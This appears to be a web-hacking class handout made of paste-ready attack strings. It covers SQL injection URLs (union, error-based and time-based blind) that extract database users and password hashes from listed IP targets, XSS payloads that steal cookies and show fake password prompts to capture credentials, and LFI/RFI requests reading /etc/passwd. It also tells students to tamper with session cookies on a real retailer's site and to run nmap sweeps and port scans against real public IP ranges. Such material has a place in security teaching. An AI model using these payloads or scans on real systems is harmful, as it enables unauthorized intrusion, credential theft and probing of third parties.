+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (SELECT DB_NAME(N))--     NOTE: "N" - just means to keep going until you run out of databases
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85))--
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85) and name>'bookmaster')--
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 in (select top 1 name from sysobjects where xtype=char(85) and name>'sysdiagrams')--
+---------------------------------------------------------------------------------------------------------
+ 
+ 
+ 
+ 
+ 
+#############################
+# Union-Based SQL Injection #
+#############################
+---------------------------Paste these one line at a time into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=2 order by 100--
+http://45.77.162.239/bookdetail.aspx?id=2 order by 50--
+http://45.77.162.239/bookdetail.aspx?id=2 order by 25--
+http://45.77.162.239/bookdetail.aspx?id=2 order by 10--
+http://45.77.162.239/bookdetail.aspx?id=2 order by 5--
+http://45.77.162.239/bookdetail.aspx?id=2 order by 6--
+http://45.77.162.239/bookdetail.aspx?id=2 order by 7--
+http://45.77.162.239/bookdetail.aspx?id=2 order by 8--
+http://45.77.162.239/bookdetail.aspx?id=2 order by 9--
+http://45.77.162.239/bookdetail.aspx?id=2 union all select 1,2,3,4,5,6,7,8,9--
+---------------------------------------------------------------------------------------------------------
+ 
+    We are using a union select statement because we are joining the developer's query with one of our own.
+    Reference:
+    http://www.techonthenet.com/sql/union.php
+    The SQL UNION operator is used to combine the result sets of 2 or more SELECT statements.
+    It removes duplicate rows between the various SELECT statements.
+ 
+    Each SELECT statement within the UNION must have the same number of fields in the result sets with similar data types.
+---------------------------Paste these one line at a time into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=-2 union all select 1,2,3,4,5,6,7,8,9--
+---------------------------------------------------------------------------------------------------------
+    Negating the paramter value (changing the id=2 to id=-2) will force the pages that will echo back data to be displayed.
+ 
+---------------------------Paste these one line at a time into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=-2 union all select 1,user,@@version,4,5,6,7,8,9--
+http://45.77.162.239/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,7,8,9--
+http://45.77.162.239/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,db_name(0),8,9--
+http://45.77.162.239/bookdetail.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,master.sys.fn_varbintohexstr(password_hash),8,9 from master.sys.sql_logins--
+---------------------------------------------------------------------------------------------------------
+ 
+ 
+ 
+ 
+- Another way is to see if you can get the backend to perform an arithmetic function
+---------------------------Paste these one line at a time into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=(2)
+http://45.77.162.239/bookdetail.aspx?id=(4-2)  
+http://45.77.162.239/bookdetail.aspx?id=(4-1)
+---------------------------------------------------------------------------------------------------------
+ 
+- This is some true/false logic testing
+---------------------------Paste this into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=2 or 1=1--
+http://45.77.162.239/bookdetail.aspx?id=2 or 1=2--
+http://45.77.162.239/bookdetail.aspx?id=1*1
+http://45.77.162.239/bookdetail.aspx?id=2 or 1 >-1#
+http://45.77.162.239/bookdetail.aspx?id=2 or 1<99#
+http://45.77.162.239/bookdetail.aspx?id=2 or 1<>1#
+http://45.77.162.239/bookdetail.aspx?id=2 or 2 != 3--
+http://45.77.162.239/bookdetail.aspx?id=2 &0#
+-------------------------------------------------------------------------------------
+ 
+-- Now that we've seen the differences in the webpage with True/False SQL Injection - let's see what we can learn using it
+---------------------------Paste this into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=2 and 1=1--
+http://45.77.162.239/bookdetail.aspx?id=2 and 1=2--
+http://45.77.162.239/bookdetail.aspx?id=2 and user='joe' and 1=1--
+http://45.77.162.239/bookdetail.aspx?id=2 and user='dbo' and 1=1--
+---------------------------------------------------------------------------------------
+ 
+ 
+###############################
+# Blind SQL Injection Testing #
+###############################
+Time-Based BLIND SQL INJECTION - EXTRACT DATABASE USER
+     
+3 - Total Characters
+---------------------------Paste these one line at a time into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=2; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--
+http://45.77.162.239/bookdetail.aspx?id=2; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'--
+http://45.77.162.239/bookdetail.aspx?id=2; IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'--      (Ok, the username is 3 chars long - it waited 10 seconds)
+---------------------------------------------------------------------------------------------------------
+ 
+Let's go for a quick check to see if it's DBO
+---------------------------Paste this into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=2; IF ((USER)='dbo') WAITFOR DELAY '00:00:10'--
+-------------------------------------------------------------------------------------
+Yup, it waited 10 seconds so we know the username is 'dbo' - let's give you the syntax to verify it just for fun.
+ 
+D  - 1st Character
+---------------------------Paste these one line at a time into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=97) WAITFOR DELAY '00:00:10'--  
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=98) WAITFOR DELAY '00:00:10'--
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=99) WAITFOR DELAY '00:00:10'--
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),1,1)))=100) WAITFOR DELAY '00:00:10'--  (Ok, first letter is a 100 which is the letter 'd' - it waited 10 seconds)
+---------------------------------------------------------------------------------------------------------
+ 
+B - 2nd Character
+---------------------------Paste these one line at a time into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),2,1)))>97) WAITFOR DELAY '00:00:10'--   Ok, good it waited for 10 seconds
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),2,1)))=98) WAITFOR DELAY '00:00:10'--   Ok, good it waited for 10 seconds
+---------------------------------------------------------------------------------------------------------
+ 
+O - 3rd Character
+---------------------------Paste these one line at a time into Firefox-----------------------------------
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>97) WAITFOR DELAY '00:00:10'--   Ok, good it waited for 10 seconds
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>115) WAITFOR DELAY '00:00:10'--
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>105) WAITFOR DELAY '00:00:10'--      Ok, good it waited for 10 seconds
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))>110) WAITFOR DELAY '00:00:10'--      Ok, good it waited for 10 seconds
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=109) WAITFOR DELAY '00:00:10'--
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=110) WAITFOR DELAY '00:00:10'--      
+http://45.77.162.239/bookdetail.aspx?id=2; IF (ASCII(lower(substring((USER),3,1)))=111) WAITFOR DELAY '00:00:10'--      Ok, good it waited for 10 seconds
+---------------------------------------------------------------------------------------------------------
+ 
+ 
+ 
+ 
+
+#######################
+# Attacking PHP/MySQL #
+#######################
+ 
+Go to LAMP Target homepage
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/
+-------------------------------------------------------------------------------------
+ 
+ 
+Clicking on the Acer Link:
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer
+-------------------------------------------------------------------------------------
+ 
+    - Found parameter passing (answer yes to question 1)
+    - Insert ' to test for SQLI
+ 
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer'
+-------------------------------------------------------------------------------------  
+ 
+Page returns the following error:
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''acer''' at line 1
+ 
+ 
+ 
+In order to perform union-based sql injection - we must first determine the number of columns in this query.
+We do this using the ORDER BY
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer' order by 100-- +
+-------------------------------------------------------------------------------------
+ 
+ 
+Page returns the following error:
+Unknown column '100' in 'order clause'
+ 
+ 
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer' order by 50-- +
+-------------------------------------------------------------------------------------  
+ 
+ 
+Page returns the following error:
+Unknown column '50' in 'order clause'
+ 
+ 
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer' order by 25-- +
+-------------------------------------------------------------------------------------
+ 
+Page returns the following error:
+Unknown column '25' in 'order clause'
+ 
+ 
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer' order by 12-- +
+-------------------------------------------------------------------------------------
+ 
+Page returns the following error:
+Unknown column '12' in 'order clause'
+ 
+ 
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer' order by 6-- +
+-------------------------------------------------------------------------------------
+---Valid page returned for 5 and 6...error on 7 so we know there are 6 columns
+ 
+ 
+ 
+Now we build out the union all select statement with the correct number of columns
+ 
+Reference:
+http://www.techonthenet.com/sql/union.php
+ 
+ 
+---------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=acer' union all select 1,2,3,4,5,6-- +
+-------------------------------------------------------------------------------------
+ 
+ 
+ 
+Now we negate the parameter value 'acer' by turning into the word 'null':
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,4,5,6-- j
+-------------------------------------------------------------------------------------
+ 
+We see that a 4 and a 5 are on the screen. These are the columns that will echo back data
+ 
+ 
+Use a cheat sheet for syntax:
+http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+ 
+---------------------------Paste these one line at a time into Firefox-----------------------------------
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user(),5,6-- j
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user(),version(),6-- j
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user(),@@version,6-- +
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user(),@@datadir,6-- +
+ 
+http://45.63.104.73/acre2.php?lap=null' union all select 1,2,3,user,password,6 from mysql.user -- a
+------------------------------------------------------------------------------------- -------------------
+ 
+ 
+ 
+ 
+Sometimes students ask about the "-- j" or "-- +" that I append to SQL injection attack string.
+ 
+Here is a good reference for it:
+https://www.symantec.com/connect/blogs/mysql-injection-comments-comments
+ 
+Both attackers and penetration testers alike often forget that MySQL comments deviate from the standard ANSI SQL specification. The double-dash comment syntax was first supported in MySQL 3.23.3. However, in MySQL a double-dash comment "requires the second dash to be followed by at least one whitespace or control character (such as a space, tab, newline, and so on)." This double-dash comment syntax deviation is intended to prevent complications that might arise from the subtraction of negative numbers within SQL queries. Therefore, the classic SQL injection exploit string will not work against backend MySQL databases because the double-dash will be immediately followed by a terminating single quote appended by the web application. However, in most cases a trailing space needs to be appended to the classic SQL exploit string. For the sake of clarity we'll append a trailing space and either a "+" or a letter.
+ 
+ 
+###############################################################################
+# What is XSS                                                                 #
+# https://s3.amazonaws.com/infosecaddictsfiles/2-Intro_To_XSS.pptx            #
+###############################################################################
+ 
+OK - what is Cross Site Scripting (XSS)
+ 
+1. Use Firefox to browse to the following location:
+    ---------------------------Paste this into Firefox-----------------------------------
+    http://45.63.104.73/xss_practice/
+    -------------------------------------------------------------------------------------
+ 
+    A really simple search page that is vulnerable should come up.
+ 
+ 
+ 
+ 
+2. In the search box type:
+    ---------------------------Paste this into Firefox-----------------------------------
+    <script>alert('So this is XSS')</script>
+    -------------------------------------------------------------------------------------
+ 
+ 
+    This should pop-up an alert window with your message in it proving XSS is in fact possible.
+    Ok, click OK and then click back and go back to http://45.63.104.73/xss_practice/
+ 
+ 
+3. In the search box type:
+    ---------------------------Paste this into Firefox-----------------------------------
+    <script>alert(document.cookie)</script>
+    -------------------------------------------------------------------------------------
+ 
+ 
+    This should pop-up an alert window with your message in it proving XSS is in fact possible and your cookie can be accessed.
+    Ok, click OK and then click back and go back to http://45.63.104.73/xss_practice/
+ 
+4. Now replace that alert script with:
+    ---------------------------Paste this into Firefox-----------------------------------
+    <script>document.location="http://45.63.104.73/xss_practice/cookie_catcher.php?c="+document.cookie</script>
+    -------------------------------------------------------------------------------------
+ 
+This will actually pass your cookie to the cookie catcher that we have sitting on the webserver.
+ 
+ 
+5. Now view the stolen cookie at:
+   ---------------------------Paste this into Firefox-----------------------------------
+   http://45.63.104.73/xss_practice/cookie_stealer_logs.html
+   -------------------------------------------------------------------------------------  
+ 
+The cookie catcher writes to this file and all we have to do is make sure that it has permissions to be written to.
+ 
+ 
+ 
+ 
+ 
+ 
+############################
+# A Better Way To Demo XSS #
+############################
+ 
+ 
+Let's take this to the next level. We can modify this attack to include some username/password collection. Paste all of this into the search box.
+ 
+ 
+Use Firefox to browse to the following location:
+---------------------------Paste this into Firefox-----------------------------------
+    http://45.63.104.73/xss_practice/
+-------------------------------------------------------------------------------------  
+ 
+ 
+Paste this in the search box
+----------------------------
+ 
+ 
+Option 1
+--------
+---------------------------Paste this into Firefox-----------------------------------
+<script>
+password=prompt('Your session is expired. Please enter your password to continue',' ');
+document.write("<img src=\"http://45.63.104.73/xss_practice/passwordgrabber.php?password=" +password+"\">");
+</script>
+-------------------------------------------------------------------------------------  
+ 
+Now view the stolen cookie at:
+---------------------------Paste this into Firefox-----------------------------------
+    http://45.63.104.73/xss_practice/passwords.html
+-------------------------------------------------------------------------------------  
+ 
+ 
+Option 2
+--------
+-------------------------Paste this into Firefox-----------------------------------
+<script>
+username=prompt('Please enter your username',' ');
+password=prompt('Please enter your password',' ');
+document.write("<img src=\"http://45.63.104.73/xss_practice/unpw_catcher.php?username="+username+"&password="+password+"\">");
+</script>
+-------------------------------------------------------------------------------------  
+ 
+ 
+ 
+Now view the stolen cookie at:
+http://45.63.104.73/xss_practice/username_password_logs.html
+ 
+ 
+ 
+ 
+
+
+
+#######################################
+# Playing Around with Session cookies #
+#######################################
+
+Step 1: Browse to NewEgg.com
+-------------------------Paste this into Firefox-----------------------------------
+https://secure.newegg.com/
+----------------------------------------------------------------------------------
+ 
+ 
+Step 2: Browse to the shopping cart page NewEgg.com
+-------------------------Paste this into Firefox-----------------------------------
+https://secure.newegg.com/Shopping/ShoppingCart.aspx?Submit=view
+----------------------------------------------------------------------------------
+ 
+ 
+Step 3: View the current session ID
+-------------------------Paste this into Firefox-----------------------------------
+javascript:void(document.write(document.cookie))
+------------------------------------------------------------------------------------
+ 
+Step 4: Go back to the shopping cart page (click the back button)
+---------------------------------------------------------------------------------
+https://secure.newegg.com/Shopping/ShoppingCart.aspx?Submit=view
+---------------------------------------------------------------------------------
+ 
+ 
+Step 5: Now let's modify the session ID
+-------------------------Paste this into Firefox-----------------------------------
+javascript:void(document.cookie="PHPSessionID=wow-this-is-fun")
+------------------------------------------------------------------------------------
+ 
+ 
+ 
+Step 6: Go back to the shopping cart page (click the back button)
+---------------------------------------------------------------------------------
+https://secure.newegg.com/Shopping/ShoppingCart.aspx?Submit=view
+---------------------------------------------------------------------------------
+ 
+ 
+ 
+Step 7: View the current session ID
+-------------------------Paste this into Firefox-----------------------------------
+javascript:void(document.write(document.cookie))
+-----------------------------------------------------------------------------------
+
+
+#########################################
+# Let's try a local file include (LFI)  #
+#########################################
+- Here is an example of an LFI
+- Open this page in Firefox:
+-------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/showfile.php?filename=contactus.txt
+-------------------------------------------------------------------------------------
+ 
+ 
+- Notice the page name (showfile.php) and the parameter name (filename) and the filename (contactus.txt)
+- Here you see a direct reference to a file on the local filesystem of the victim machine.
+- You can attack this by doing the following:
+-------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/showfile.php?filename=/etc/passwd
+-------------------------------------------------------------------------------------
+ 
+ 
+- This is an example of a Local File Include (LFI), to change this attack into a Remote File Include (RFI) you need some content from
+- somewhere else on the Internet. Here is an example of a text file on the web:
+-------------------------Paste this into Firefox-----------------------------------
+http://www.opensource.apple.com/source/SpamAssassin/SpamAssassin-127.2/SpamAssassin/t/data/etc/hello.txt
+-------------------------------------------------------------------------------------
+ 
+- Now we can attack the target via RFI like this:
+-------------------------Paste this into Firefox-----------------------------------
+http://45.63.104.73/showfile.php?filename=http://www.opensource.apple.com/source/SpamAssassin/SpamAssassin-127.2/SpamAssassin/t/data/etc/hello.txt
+-------------------------------------------------------------------------------------
+
+
+
+Step 1: Download and Install Nmap
+---------------------------------
+Windows: https://nmap.org/dist/nmap-7.70-setup.exe
+Mac OS X: https://nmap.org/dist/nmap-7.70.dmg
+ 
+Linux:
+--- Fedora/CentOS/RHEL:    sudo yum install -y nmap
+--- Ubuntu/Mint/Debian:    sudo apt-get install -y nmap
+ 
+ 
+ 
+
+
+Step 2: Perform basic nmap scans
+--------------------------------
+
+########################
+# Scanning Methodology #
+########################
+ 
+- Ping Sweep
+What's alive?
+------------
+Note: On windows you won't need to use the word "sudo" in front of the command below:
+ 
+---------------------------On Linux or Mac OS X type This-----------------------------------
+sudo nmap -sP 157.166.226.*
+ 
+---------------------------or on Windows type:---------------------------------------------
+c:\nmap -sP 157.166.226.*
+ 
+--------------------------------------------------------------------------------------------
+ 
+ 
+ 
+    -if -SP yields no results try:
+Note: On windows you won't need to use the word "sudo" in front of the command below:
+---------------------------On Linux or Mac OS X type This-----------------------------------
+sudo nmap -sL 157.166.226.*
+ 
+---------------------------or on Windows type:---------------------------------------------
+c:\nmap -sL 157.166.226.*
+ 
+------------------------------------------------------------------------------------------
+ 
+ 
+ 
+    -Look for hostnames:
+Note: On windows you won't need to use the word "sudo" in front of the command below:
+---------------------------On Linux or Mac OS X type This-----------------------------------
+sudo nmap -sL 157.166.226.* | grep com
+ 
+---------------------------or on Windows type:---------------------------------------------
+c:\nmap -sP 157.166.226.* | findstr "cnn"
+ 
+-------------------------------------------------------------------------------------------
+ 
+ 
+ 
+- Port Scan
+What's where?
+------------
+Note: On windows you won't need to use the word "sudo" in front of the command below:
+---------------------------On Linux or Mac OS X type This-----------------------------------
+sudo nmap -sS 162.243.126.247
+ 
+---------------------------or on Windows type:----------------------------------------------
+c:\nmap -sS 162.243.126.247
+ 
+--------------------------------------------------------------------------------------------
+ 
+ 
+ 
+- Bannergrab/Version Query
+What versions of software are running
+-------------------------------------
+Note: On windows you won't need to use the word "sudo" in front of the command below:
+---------------------------On Linux or Mac OS X type This-----------------------------------
+sudo nmap -sV 162.243.126.247
+ 
+---------------------------or on Windows type:---------------------------------------------
+c:\nmap -sV 162.243.126.247
+-------------------------------------------------------------------------------------------
+ 
+ 
+ 
+Let's dig into this a little bit more:
+-------------------------------------
+Note: On windows you won't need to use the word "sudo" in front of the command below:
+---------------------------On Linux or Mac OS X type This-----------------------------------
+sudo nmap -sV --script=http-headers 162.243.126.247 -p 80,443
+ 
+---------------------------or on Windows type:---------------------------------------------
+c:\nmap -sV --script=http-headers 162.243.126.247 -p 80,443
+-------------------------------------------------------------------------------------------
+ 
+ 
+ 
+- Vulnerability Research
+Lookup the banner versions for public exploits
+----------------------------------------------
+http://exploit-db.com
+http://securityfocus.com/bid
+https://packetstormsecurity.com/files/tags/exploit/
